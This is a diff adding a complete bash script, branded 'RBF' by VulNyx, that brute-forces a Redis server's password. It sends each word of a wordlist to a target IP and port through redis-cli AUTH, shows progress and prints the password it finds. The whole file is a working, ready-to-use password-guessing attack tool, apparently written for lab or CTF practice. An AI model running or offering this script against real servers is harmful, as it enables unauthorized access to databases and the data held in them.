@@ -1,0 +1,98 @@
+#!/bin/bash
+
+readonly RED="\e[91m"
+readonly GREEN="\e[92m"
+readonly YELLOW="\e[93m"
+readonly BLUE="\e[94m"
+readonly WHITE="\e[97m"
+readonly END="\e[0m"
+readonly SEPARATOR=" ────────────────────────────"
+
+trap ctrl_c INT
+
+function dependencies(){
+  which redis-cli &>/dev/null
+  if [ "$(echo $?)" != "0" ]; then
+    apt install -y redis-tools &>/dev/null
+  fi
+}
+
+function banner(){
+  echo
+  echo -e "${GREEN}   ██████╗░██████╗░███████╗${END}"
+  echo -e "${GREEN}   ██╔══██╗██╔══██╗██╔════╝${END}"
+  echo -e "${GREEN}   ██████╔╝██████╦╝█████╗░░${END}"
+  echo -e "${GREEN}   ██╔══██╗██╔══██╗██╔══╝░░${END}"
+  echo -e "${GREEN}   ██║░░██║██████╦╝██║░░░░░${END}"
+  echo -e "${GREEN}   ╚═╝░░╚═╝╚═════╝░╚═╝░░░░░${END}"
+  echo -e "   by ${YELLOW}VulNyx™${END}   ver: ${YELLOW}v1.0.0${END}"
+  echo -e "${SEPARATOR}"
+  echo -e "|   ${RED}REDIS${END} ─ ${RED}BRUTE${END} ─ ${RED}FORCE${END}    |"
+  echo -e "${SEPARATOR}"
+}
+
+function help(){
+  echo -e "\n ❓  Usage: RBF [OPTIONS]\n"
+  echo -e " 🌐  Get Redis password by brute force attack.\n"
+  echo -e " 📋  Options:"
+  echo -e "       -t <TARGET>    Specify the target IP."
+  echo -e "       -p <PORT>      Specify the target port."
+  echo -e "       -w <WORDLIST>  Specify the path where the wordlist is located."
+  echo -e "       -h             Display this help message and exit.\n"
+  echo -e " 💡  Examples:"
+  echo -e "       RBF -t 192.168.1.2 -p 6379 -w rockyou.txt"
+  echo -e "       RBF -h \n"
+  echo -e "${SEPARATOR}\n"
+}
+
+function info(){
+  echo -e " 🎯 Target   | ${BLUE}${TARGET}${WHITE}:${BLUE}${PORT}${END}"
+  echo -e " 📖 Wordlist | ${BLUE}${WORDLIST}${END}"
+}
+
+function ctrl_c(){
+  echo
+  tput cnorm
+  exit 1
+}
+
+while getopts ":t:p:w:" ARG; do
+  case ${ARG} in
+    t) TARGET=$OPTARG; let parameter_counter+=1 ;;
+    p) PORT=$OPTARG; let parameter_counter+=1 ;;
+    w) WORDLIST=$OPTARG; let parameter_counter+=1 ;;
+  esac
+done
+
+if [[ -n "${TARGET}" && -n "${PORT}" && -n "${WORDLIST}" ]]; then
+  dependencies
+  banner
+  info
+else
+  banner
+  help
+  exit 0
+fi
+
+LINES=$(wc -l ${WORDLIST})
+REGEX="([0-9]+).${WORDLIST}"
+[[ ${LINES} =~ ${REGEX} ]]
+SIZ="${BASH_REMATCH[1]}"
+while IFS= read -r PASSWORD; do
+  LINE=$((LINE + 1))
+  PROGRESS=$((LINE * 100 / SIZ))
+  echo -ne "\e[?25l\r\033[K 🔎 Status   | ${YELLOW}${LINE}/${SIZ}/${PROGRESS}%/${PASSWORD}${END}"
+  redis-cli -h ${TARGET} -p ${PORT} AUTH "${PASSWORD}" | grep "OK" &>/dev/null
+  if [ $? -eq 0 ]; then
+    echo -e "\n 💥 Password | ${GREEN}${PASSWORD}${END}"
+    echo -e "${SEPARATOR}\n"
+    sleep 2
+    tput cnorm
+    exit 0
+  fi
+done < ${WORDLIST}
+echo -e "\n ❗ Fuck!    | ${RED}Password not found${END}"
+echo -e "${SEPARATOR}\n"
+sleep 2
+tput cnorm
+exit 0
